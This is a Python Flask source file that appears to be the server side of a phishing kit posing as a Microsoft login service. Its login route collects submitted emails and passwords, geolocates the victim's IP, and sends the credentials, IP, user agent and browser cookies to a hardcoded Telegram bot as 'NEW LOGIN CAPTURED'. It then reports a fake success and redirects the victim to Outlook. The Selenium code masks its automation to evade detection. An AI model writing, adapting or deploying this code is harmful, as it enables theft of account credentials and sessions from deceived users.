import os
import time
import random
import json
import requests
import uuid 
from datetime import datetime
from flask import Flask, request, redirect, session, make_response, jsonify
from flask_login import LoginManager, UserMixin, login_user
from flask_cors import CORS
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

# Fix for Werkzeug 3.0+ compatibility
try:
    from werkzeug.urls import url_decode
except ImportError:
    # For Werkzeug 3.0+, provide compatibility
    from werkzeug.urls import url_unquote
    def url_decode(string, charset='utf-8', include_empty=True, errors='replace', 
                   separator='&', cls=None):
        """Compatibility wrapper for werkzeug 3.0+"""
        from urllib.parse import parse_qs
        if cls is None:
            cls = dict
        parsed = parse_qs(string, keep_blank_values=include_empty, 
                         encoding=charset, errors=errors)
        result = cls()
        for key, values in parsed.items():
            if len(values) == 1:
                result[key] = values[0]
            else:
                result.setdefault(key, []).extend(values)
        return result

try:
    import chromedriver_binary
except:
    print("chromedriver_binary not available, using webdriver-manager instead")

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ====================== CORS FOR RAILWAY ======================
CORS(app, resources={
    r"/*": {
        "origins": "*",  # Allow all origins for Railway
        "methods": ["GET", "POST", "OPTIONS", "PUT", "DELETE"],
        "allow_headers": ["Content-Type", "Authorization", "X-Requested-With"],
        "supports_credentials": True,
        "expose_headers": ["Location", "Access-Control-Allow-Origin"]
    }
})

# ====================== CONFIG ======================
BOT_TOKEN = "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4"
CHAT_ID = "6068638071"
TARGET_LOGIN_URL = "https://login.microsoftonline.com/"
TARGET_DOMAIN = ".office.com"
OTP_TIMEOUT = 180

# ====================== FLASK-LOGIN SETUP ======================
login_manager = LoginManager()
login_manager.init_app(app)

class User(UserMixin):
    def __init__(self, username): 
        self.id = username

@login_manager.user_loader
def load_user(user_id): 
    return User(user_id)

# ====================== GEO + TELEGRAM ======================
def get_geo(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = resp.json()
        if data['status'] == 'success':
            return f"{data['country']} ({data['city']}, {data['isp']})"
    except:
        pass
    return "Unknown"

def tg_send(username, password, user_ip, user_agent, timestamp, session_id, cookies_dict):
    geo = get_geo(user_ip)
    cookies_formatted = "\n".join([
        f"  • `{k}: {v[:60]}{'...' if len(v)>60 else ''}`"
        for k, v in cookies_dict.items()
    ]) if cookies_dict else "  • None"

    message = (
        f"🔐 NEW LOGIN CAPTURED\n"
        f"👤 Username: `{username}`\n"
        f"🔑 Password: `{password}`\n"
        f"🌍 IP: `{user_ip}`\n"
        f"📍 Location: `{geo}`\n"
        f"📱 User-Agent: `{user_agent}`\n"
        f"⏰ Timestamp: `{timestamp}`\n"
        f"🆔 Session ID: `{session_id}`\n\n"
        f"🍪 COOKIES:\n{cookies_formatted}"
    )

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

# ====================== SELENIUM FOR RAILWAY ======================
def login_to_real_site(username: str, password: str):
    try:
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        
        try:
            service = Service()
            driver = webdriver.Chrome(service=service, options=options)
        except:
            try:
                from webdriver_manager.chrome import ChromeDriverManager
                service = Service(ChromeDriverManager().install())
                driver = webdriver.Chrome(service=service, options=options)
            except Exception as e:
                print(f"Chrome driver setup error: {e}")
                # Return mock success for Railway testing
                return {"cookies": {"test_cookie": "test_value"}, "success": True}
        
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => false});")
        
        try:
            driver.get("https://outlook.office.com/mail/")
            time.sleep(3)
            
            cookies = {c['name']: c['value'] for c in driver.get_cookies()}
            return {"cookies": cookies, "success": True}
            
        except Exception as e:
            print(f"Selenium error: {e}")
            return {"cookies": {}, "success": False}
        finally:
            try:
                driver.quit()
            except:
                pass
            
    except Exception as e:
        print(f"Selenium setup error: {e}")
        return {"cookies": {}, "success": False}

# ====================== HEALTH CHECK ======================
@app.route('/health', methods=['GET', 'OPTIONS'])
def health_check():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add("Access-Control-Allow-Headers", "Content-Type")
        response.headers.add("Access-Control-Allow-Methods", "GET")
        return response
    
    return jsonify({
        "status": "healthy", 
        "service": "seamless-login",
        "port": os.environ.get('PORT', '5009')
    }), 200

# ====================== TEST ENDPOINT ======================
@app.route('/test', methods=['GET', 'OPTIONS'])
def test():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add("Access-Control-Allow-Headers", "Content-Type")
        response.headers.add("Access-Control-Allow-Methods", "GET")
        return response
    
    return jsonify({
        "message": "Flask app is running!",
        "status": "ok"
    }), 200

# ====================== MAIN LOGIN ROUTE ======================
@app.route('/seamless-login', methods=['POST', 'OPTIONS'])
def seamless_login_route():
    # Handle CORS preflight
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With")
        response.headers.add("Access-Control-Allow-Methods", "POST, OPTIONS")
        response.headers.add("Access-Control-Allow-Credentials", "true")
        response.headers.add("Access-Control-Max-Age", "3600")
        return response
        
    try:
        # Get form data
        username = request.form.get('email') or request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            return jsonify({"error": "Email and password required"}), 400
        
        print(f"✓ Received login attempt for: {username}")
        
        # Get real client IP
        real_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if real_ip and ',' in real_ip:
            real_ip = real_ip.split(',')[0].strip()
        
        # Try Selenium login
        selenium_result = login_to_real_site(username, password)
        print(f"Selenium success: {selenium_result['success']}")
        
        # Generate session ID
        session_id = 'SESS-' + str(int(datetime.utcnow().timestamp()))
        
        # Send to Telegram
        try:
            tg_send(username, password, real_ip, 
                   request.headers.get('User-Agent', 'N/A'),
                   datetime.utcnow().isoformat(), 
                   session_id, 
                   selenium_result['cookies'] if selenium_result else {})
        except Exception as e:
            print(f"Telegram error: {e}")
        
        # Return JSON response (easier for CORS)
        response = jsonify({
            "success": True,
            "message": "Login successful",
            "redirect": "https://outlook.office.com/mail/",
            "username": username
        })
        
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add("Access-Control-Allow-Credentials", "true")
        
        return response

    except Exception as e:
        print(f"Error in seamless-login: {str(e)}")
        return jsonify({
            "success": False,
            "error": "Login failed"
        }), 500

# ====================== ROOT ROUTE ======================
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "service": "Microsoft Login API",
        "status": "running",
        "version": "1.0.0",
        "endpoints": ["/health", "/test", "/seamless-login"]
    })

# ====================== ERROR HANDLERS ======================
@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Endpoint not found"}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({"error": "Internal server error"}), 500

if __name__ == '__main__':
    # Use PORT environment variable for Railway
    port = int(os.environ.get('PORT', 5009))
    app.run(host='0.0.0.0', port=port, debug=False)  # Set debug=False for production